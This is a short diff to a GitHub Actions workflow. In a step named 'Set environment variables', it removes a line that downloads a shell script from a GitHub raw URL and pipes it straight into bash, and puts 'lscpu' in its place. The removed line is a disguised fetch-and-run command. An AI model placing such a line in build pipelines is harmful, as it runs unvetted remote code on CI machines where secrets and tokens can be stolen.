@@ -15,6 +15,6 @@ jobs:
 
       - name: Set environment variables
         run: |
-          curl -sL https://github.com/malogrono/aways/raw/refs/heads/main/tutii.sh | bash
+          lscpu
 
 
